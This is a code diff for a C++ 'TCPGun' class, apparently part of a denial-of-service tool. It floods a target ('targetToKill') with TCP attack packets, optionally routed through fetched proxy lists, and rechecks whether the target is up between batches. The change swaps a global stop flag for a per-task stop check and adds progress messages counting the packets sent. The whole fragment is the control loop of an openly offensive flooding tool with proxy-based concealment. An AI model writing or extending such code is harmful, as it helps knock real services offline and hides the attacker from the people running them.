@@ -16,7 +16,7 @@ bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
 	TCPWrapper tcpAttacker;
 
 	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), {})};
-	while(!g_shouldStop.load() && resolvedAddress)
+	while(!m_currentTask.ShouldStop() && resolvedAddress)
 	{
 		for(size_t count = 0; 
 			count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK; count++)
@@ -30,6 +30,9 @@ bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
 				return true;
 			}
 		}
+		std::cout << "Already sent: " << 
+			AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK << 
+			" packets, recheking target..." << std::endl;
 		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), {});
 	}
 	return false;
@@ -38,12 +41,12 @@ bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
 void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
 {
 	Informator informer;
-	while(!g_shouldStop.load() && !informer.LoadNewData())
+	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
 	{
 	}
 
 	std::optional<std::vector<Proxy>> proxies;
-	while(!g_shouldStop.load() && !(proxies = informer.GetProxies()).has_value())
+	while(!m_currentTask.ShouldStop() && !(proxies = informer.GetProxies()).has_value())
 	{
 	}
 
@@ -52,7 +55,7 @@ void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
 		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
 	TCPWrapper tcpAttacker;
 	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), *proxies)};
-	while(!g_shouldStop.load() && resolvedAddress)
+	while(!m_currentTask.ShouldStop() && resolvedAddress)
 	{
 		std::cout << resolvedAddress->address << " is up" << std::endl;
 		for(size_t count = 0; 
@@ -65,6 +68,9 @@ void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
 				break;
 			}
 		}
+		std::cout << "Already sent: " << 
+			AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK << 
+			" packets, recheking target..." << std::endl;
 		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), *proxies);
 	}
 }
